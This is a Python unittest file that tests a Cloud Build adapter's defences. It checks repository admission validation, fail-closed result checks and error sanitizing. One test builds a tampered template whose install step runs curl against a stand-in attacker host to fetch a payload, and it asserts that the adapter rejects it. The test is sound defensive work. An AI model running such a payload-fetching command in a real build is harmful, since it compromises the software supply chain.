from __future__ import annotations

import importlib
import sys
import unittest
from dataclasses import replace
from datetime import UTC, datetime
from pathlib import Path
from typing import Callable

from google.cloud.devtools import cloudbuild_v1

TEST_ROOT = Path(__file__).resolve().parent
SRC_ROOT = Path(__file__).resolve().parents[1] / "src"
for path in (TEST_ROOT, SRC_ROOT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))


NOW = datetime(2026, 8, 4, 2, 0, 0, tzinfo=UTC)
SOURCE_SHA = "a" * 40
PROJECT_ID = "mim-prod-123456"
REGION = "asia-northeast3"
SOURCE_RESOURCE = (
    f"projects/{PROJECT_ID}/locations/{REGION}/connections/mim-github/"
    "repositories/sample-app"
)
BUILD_SERVICE_ACCOUNT = (
    f"projects/{PROJECT_ID}/serviceAccounts/"
    f"mim-build@{PROJECT_ID}.iam.gserviceaccount.com"
)
BUILDER_IMAGE = (
    f"{REGION}-docker.pkg.dev/{PROJECT_ID}/mim-platform/mim-builder@sha256:"
    + "c" * 64
)
IMAGE_DIGEST = "sha256:" + "d" * 64


def build_request(**admission_overrides: object) -> object:
    execution = importlib.import_module("mim_control_plane.ports.execution")
    models = importlib.import_module("mim_control_plane.domain.models")
    states = importlib.import_module("mim_control_plane.domain.states")
    classifier = importlib.import_module("mim_control_plane.services.classifier")
    templates = importlib.import_module("mim_control_plane.services.build_template")
    task = execution.QueuedDeployTask.from_snapshot(
        operation_id=models.OperationId("operation-1"),
        expected_operation_version=1,
        workload_id=models.WorkloadId("workload-1"),
        expected_workload_version=1,
        admission_id=models.RepositoryAdmissionId("repo-101"),
        expected_admission_version=1,
        expected_source_sha=SOURCE_SHA,
        idempotency_key="deploy-1",
        queued_at=NOW,
        snapshot={
            "app.py": b"import streamlit\n",
            "requirements.txt": b"streamlit==1.40.0\n",
        },
    )
    admission_payload: dict[str, object] = {
        "id": models.RepositoryAdmissionId("repo-101"),
        "repository_numeric_id": 101,
        "owner": "madupmarketing",
        "name": "sample-app",
        "installation_id": 303,
        "state": states.RepositoryAdmissionState.ADMITTED,
        "admitted_sha": SOURCE_SHA,
        "created_at": NOW,
        "updated_at": NOW,
    }
    admission_payload.update(admission_overrides)
    admission = models.RepositoryAdmission(**admission_payload)
    classification = classifier.WorkloadClassification(
        kind=states.WorkloadKind.STREAMLIT,
        entrypoint="app.py",
    )
    return execution.BuildRequest.from_task(
        task=task,
        admission=admission,
        classification=classification,
        template=templates.build_template_for(classification),
    )


class FakeBuildOperation:
    def __init__(
        self,
        request: cloudbuild_v1.CreateBuildRequest,
        result_factory: Callable[
            [cloudbuild_v1.CreateBuildRequest], cloudbuild_v1.Build
        ],
    ) -> None:
        self.request = request
        self.result_factory = result_factory
        self.timeouts: list[float] = []

    def result(self, *, timeout: float) -> cloudbuild_v1.Build:
        self.timeouts.append(timeout)
        return self.result_factory(self.request)


class FakeCloudBuildClient:
    def __init__(
        self,
        result_factory: Callable[
            [cloudbuild_v1.CreateBuildRequest], cloudbuild_v1.Build
        ],
    ) -> None:
        self.result_factory = result_factory
        self.requests: list[cloudbuild_v1.CreateBuildRequest] = []
        self.operations: list[FakeBuildOperation] = []

    def create_build(
        self,
        *,
        request: cloudbuild_v1.CreateBuildRequest,
    ) -> FakeBuildOperation:
        self.requests.append(request)
        operation = FakeBuildOperation(request, self.result_factory)
        self.operations.append(operation)
        return operation


def successful_build_result(
    request: cloudbuild_v1.CreateBuildRequest,
) -> cloudbuild_v1.Build:
    submitted = request.build
    return cloudbuild_v1.Build(
        name=f"projects/{PROJECT_ID}/locations/{REGION}/builds/build-1",
        project_id=PROJECT_ID,
        status=cloudbuild_v1.Build.Status.SUCCESS,
        results=cloudbuild_v1.Results(
            images=(
                cloudbuild_v1.BuiltImage(
                    name=submitted.images[0],
                    digest=IMAGE_DIGEST,
                ),
            )
        ),
        source_provenance=cloudbuild_v1.SourceProvenance(
            resolved_connected_repository=submitted.source.connected_repository
        ),
    )


class BuildSourceContractTests(unittest.TestCase):
    def test_build_request_carries_the_exact_loaded_repository_admission(self) -> None:
        execution = importlib.import_module("mim_control_plane.ports.execution")
        models = importlib.import_module("mim_control_plane.domain.models")
        states = importlib.import_module("mim_control_plane.domain.states")
        classifier = importlib.import_module("mim_control_plane.services.classifier")
        templates = importlib.import_module("mim_control_plane.services.build_template")
        task = execution.QueuedDeployTask.from_snapshot(
            operation_id=models.OperationId("operation-1"),
            expected_operation_version=1,
            workload_id=models.WorkloadId("workload-1"),
            expected_workload_version=1,
            admission_id=models.RepositoryAdmissionId("repo-101"),
            expected_admission_version=1,
            expected_source_sha=SOURCE_SHA,
            idempotency_key="deploy-1",
            queued_at=NOW,
            snapshot={
                "app.py": b"import streamlit\n",
                "requirements.txt": b"streamlit==1.40.0\n",
            },
        )
        admission = models.RepositoryAdmission(
            id=models.RepositoryAdmissionId("repo-101"),
            repository_numeric_id=101,
            owner="madupmarketing",
            name="sample-app",
            installation_id=303,
            state=states.RepositoryAdmissionState.ADMITTED,
            admitted_sha=SOURCE_SHA,
            created_at=NOW,
            updated_at=NOW,
        )
        classification = classifier.WorkloadClassification(
            kind=states.WorkloadKind.STREAMLIT,
            entrypoint="app.py",
        )

        request = execution.BuildRequest.from_task(
            task=task,
            admission=admission,
            classification=classification,
            template=templates.build_template_for(classification),
        )

        self.assertIsInstance(request.source, execution.AdmittedBuildSource)
        self.assertEqual(str(request.source.admission_id), "repo-101")
        self.assertEqual(request.source.repository_numeric_id, 101)
        self.assertEqual(request.source.owner, "madupmarketing")
        self.assertEqual(request.source.name, "sample-app")
        self.assertEqual(request.source.installation_id, 303)
        self.assertEqual(request.source.sha, SOURCE_SHA)

    def test_rejects_stale_revoked_or_mutable_admission_material(self) -> None:
        execution = importlib.import_module("mim_control_plane.ports.execution")
        models = importlib.import_module("mim_control_plane.domain.models")
        states = importlib.import_module("mim_control_plane.domain.states")
        classifier = importlib.import_module("mim_control_plane.services.classifier")
        templates = importlib.import_module("mim_control_plane.services.build_template")
        classification = classifier.WorkloadClassification(
            kind=states.WorkloadKind.STREAMLIT,
            entrypoint="app.py",
        )

        def task(source_sha: str = SOURCE_SHA) -> object:
            return execution.QueuedDeployTask.from_snapshot(
                operation_id=models.OperationId("operation-1"),
                expected_operation_version=1,
                workload_id=models.WorkloadId("workload-1"),
                expected_workload_version=1,
                admission_id=models.RepositoryAdmissionId("repo-101"),
                expected_admission_version=1,
                expected_source_sha=source_sha,
                idempotency_key="deploy-1",
                queued_at=NOW,
                snapshot={"app.py": b"import streamlit\n"},
            )

        base: dict[str, object] = {
            "id": models.RepositoryAdmissionId("repo-101"),
            "repository_numeric_id": 101,
            "owner": "madupmarketing",
            "name": "sample-app",
            "installation_id": 303,
            "state": states.RepositoryAdmissionState.ADMITTED,
            "admitted_sha": SOURCE_SHA,
            "created_at": NOW,
            "updated_at": NOW,
        }
        cases = (
            ({"state": states.RepositoryAdmissionState.REVOKED}, SOURCE_SHA),
            ({"id": models.RepositoryAdmissionId("repo-202")}, SOURCE_SHA),
            ({"version": 2}, SOURCE_SHA),
            ({"admitted_sha": "b" * 40}, SOURCE_SHA),
            ({"repository_numeric_id": 0}, SOURCE_SHA),
            ({"installation_id": 0}, SOURCE_SHA),
            ({"admitted_sha": "main"}, "main"),
            ({"admitted_sha": "0" * 40}, "0" * 40),
        )

        for overrides, task_sha in cases:
            with self.subTest(overrides=overrides):
                payload = {**base, **overrides}
                admission = models.RepositoryAdmission(**payload)
                with self.assertRaises(ValueError):
                    execution.BuildRequest.from_task(
                        task=task(task_sha),
                        admission=admission,
                        classification=classification,
                        template=templates.build_template_for(classification),
                    )


class CloudBuildAdapterTests(unittest.TestCase):
    def binding(self, **overrides: object) -> object:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )
        payload: dict[str, object] = {
            "repository_numeric_id": 101,
            "owner": "madupmarketing",
            "name": "sample-app",
            "installation_id": 303,
            "repository_resource": SOURCE_RESOURCE,
        }
        payload.update(overrides)
        return cloud_build.ConnectedRepositoryBinding(**payload)

    def adapter(
        self,
        *,
        client: object,
        bindings: tuple[object, ...] | None = None,
        **overrides: object,
    ) -> object:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )
        payload: dict[str, object] = {
            "project_id": PROJECT_ID,
            "region": REGION,
            "build_service_account": BUILD_SERVICE_ACCOUNT,
            "builder_image": BUILDER_IMAGE,
            "bindings": (self.binding(),) if bindings is None else bindings,
            "client": client,
            "operation_timeout_seconds": 900.0,
        }
        payload.update(overrides)
        return cloud_build.CloudBuildAdapter(**payload)

    def test_submits_regional_connected_repo_build_from_only_trusted_material(
        self,
    ) -> None:
        client = FakeCloudBuildClient(successful_build_result)
        adapter = self.adapter(client=client)

        digest = adapter.build(build_request())

        self.assertEqual(digest, "d" * 64)
        self.assertEqual(len(client.requests), 1)
        request = client.requests[0]
        self.assertEqual(
            request.parent,
            f"projects/{PROJECT_ID}/locations/{REGION}",
        )
        submitted = request.build
        self.assertEqual(submitted.project_id, "")
        self.assertEqual(submitted.service_account, BUILD_SERVICE_ACCOUNT)
        self.assertEqual(
            submitted.source.connected_repository.repository,
            SOURCE_RESOURCE,
        )
        self.assertEqual(
            submitted.source.connected_repository.revision,
            SOURCE_SHA,
        )
        self.assertEqual(len(submitted.steps), 1)
        self.assertEqual(submitted.steps[0].name, BUILDER_IMAGE)
        self.assertEqual(len(submitted.images), 1)
        self.assertEqual(submitted.images[0], submitted.steps[0].args[-1])
        self.assertTrue(
            submitted.images[0].startswith(
                f"{REGION}-docker.pkg.dev/{PROJECT_ID}/mim/workloads:"
            )
        )
        self.assertEqual(
            submitted.options.logging,
            cloudbuild_v1.BuildOptions.LoggingMode.CLOUD_LOGGING_ONLY,
        )
        flattened_args = " ".join(submitted.steps[0].args)
        self.assertNotIn("cloudbuild.yaml", flattened_args)
        self.assertNotIn("requirements.txt", flattened_args)
        self.assertNotIn("npm", flattened_args)
        self.assertNotIn("pip", flattened_args)
        self.assertFalse(submitted.available_secrets.secret_manager)
        self.assertEqual(client.operations[0].timeouts, [900.0])
        self.assertFalse(hasattr(adapter, "apply"))
        self.assertFalse(hasattr(adapter, "rollback"))

    def test_rejects_nonregional_mutable_or_nondedicated_configuration(self) -> None:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )
        client = FakeCloudBuildClient(successful_build_result)
        cases = (
            {
                "region": "us-central1",
            },
            {
                "build_service_account": (
                    f"projects/{PROJECT_ID}/serviceAccounts/"
                    f"other-build@{PROJECT_ID}.iam.gserviceaccount.com"
                ),
            },
            {
                "build_service_account": (
                    "projects/other-project/serviceAccounts/"
                    "mim-build@other-project.iam.gserviceaccount.com"
                ),
            },
            {
                "builder_image": (
                    f"{REGION}-docker.pkg.dev/{PROJECT_ID}/mim-platform/"
                    "mim-builder:latest"
                ),
            },
            {
                "bindings": (
                    self.binding(),
                    self.binding(repository_resource=SOURCE_RESOURCE + "-copy"),
                )
            },
            {"bindings": ()},
        )

        for overrides in cases:
            with self.subTest(overrides=overrides):
                payload: dict[str, object] = {
                    "project_id": PROJECT_ID,
                    "region": REGION,
                    "build_service_account": BUILD_SERVICE_ACCOUNT,
                    "builder_image": BUILDER_IMAGE,
                    "bindings": (self.binding(),),
                    "client": client,
                    "operation_timeout_seconds": 900.0,
                }
                payload.update(overrides)
                with self.assertRaises(ValueError):
                    cloud_build.CloudBuildAdapter(**payload)

        wrong_resource_bindings = (
            self.binding(
                repository_resource=(
                    "projects/other-project/locations/asia-northeast3/"
                    "connections/mim-github/repositories/sample-app"
                )
            ),
            self.binding(
                repository_resource=(
                    f"projects/{PROJECT_ID}/locations/us-central1/"
                    "connections/mim-github/repositories/sample-app"
                )
            ),
            self.binding(repository_resource="not-a-resource"),
        )
        for binding in wrong_resource_bindings:
            with self.subTest(binding=binding):
                with self.assertRaises(ValueError):
                    self.adapter(client=client, bindings=(binding,))

    def test_rejects_unbound_source_and_tampered_template_before_api_call(
        self,
    ) -> None:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )
        templates = importlib.import_module("mim_control_plane.services.build_template")
        client = FakeCloudBuildClient(successful_build_result)
        adapter = self.adapter(client=client)
        requests = (
            build_request(repository_numeric_id=999),
            build_request(name="other-app"),
            build_request(installation_id=404),
            build_request(owner="otherowner"),
        )
        original = build_request()
        tampered_template = templates.BuildTemplate(
            kind=original.template.kind,
            runtime=original.template.runtime,
            install_command=("curl", "https://evil.example/payload"),
            build_command=original.template.build_command,
            launch_command=original.template.launch_command,
            required_files=original.template.required_files,
        )
        requests = requests + (replace(original, template=tampered_template),)

        for request in requests:
            with self.subTest(source=request.source, template=request.template):
                with self.assertRaises(cloud_build.CloudBuildError):
                    adapter.build(request)

        self.assertEqual(client.requests, [])

    def test_fails_closed_on_ambiguous_or_unproven_build_results(self) -> None:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )

        def result_for(
            request: cloudbuild_v1.CreateBuildRequest,
            case: str,
        ) -> cloudbuild_v1.Build:
            result = successful_build_result(request)
            if case == "status":
                result.status = cloudbuild_v1.Build.Status.FAILURE
            elif case == "project":
                result.project_id = "other-project"
            elif case == "name":
                result.name = f"projects/{PROJECT_ID}/locations/us-central1/builds/1"
            elif case == "source-resource":
                result.source_provenance.resolved_connected_repository.repository = (
                    SOURCE_RESOURCE + "-other"
                )
            elif case == "source-sha":
                result.source_provenance.resolved_connected_repository.revision = (
                    "b" * 40
                )
            elif case == "no-image":
                result.results = cloudbuild_v1.Results(images=())
            elif case == "two-images":
                result.results = cloudbuild_v1.Results(
                    images=(
                        result.results.images[0],
                        cloudbuild_v1.BuiltImage(
                            name="extra",
                            digest="sha256:" + "e" * 64,
                        ),
                    )
                )
            elif case == "image-name":
                result.results.images[0].name = "wrong"
            elif case == "digest":
                result.results.images[0].digest = "sha256:" + "D" * 64
            return result

        cases = (
            "status",
            "project",
            "name",
            "source-resource",
            "source-sha",
            "no-image",
            "two-images",
            "image-name",
            "digest",
        )
        for case in cases:
            with self.subTest(case=case):
                client = FakeCloudBuildClient(
                    lambda request, selected=case: result_for(request, selected)
                )
                adapter = self.adapter(client=client)
                with self.assertRaisesRegex(
                    cloud_build.CloudBuildError,
                    "^Cloud Build execution failed\\.$",
                ):
                    adapter.build(build_request())

    def test_sanitizes_timeout_without_retrying_or_extending_deadline(self) -> None:
        cloud_build = importlib.import_module(
            "mim_control_plane.adapters.cloud_build"
        )

        class TimeoutOperation:
            calls: list[float] = []

            def result(self, *, timeout: float) -> cloudbuild_v1.Build:
                self.calls.append(timeout)
                raise TimeoutError("sensitive upstream detail")

        class TimeoutClient:
            calls = 0
            operation = TimeoutOperation()

            def create_build(
                self,
                *,
                request: cloudbuild_v1.CreateBuildRequest,
            ) -> TimeoutOperation:
                self.calls += 1
                return self.operation

        client = TimeoutClient()
        adapter = self.adapter(client=client)

        with self.assertRaisesRegex(
            cloud_build.CloudBuildError,
            "^Cloud Build execution failed\\.$",
        ):
            adapter.build(build_request())

        self.assertEqual(client.calls, 1)
        self.assertEqual(client.operation.calls, [900.0])


if __name__ == "__main__":
    unittest.main()
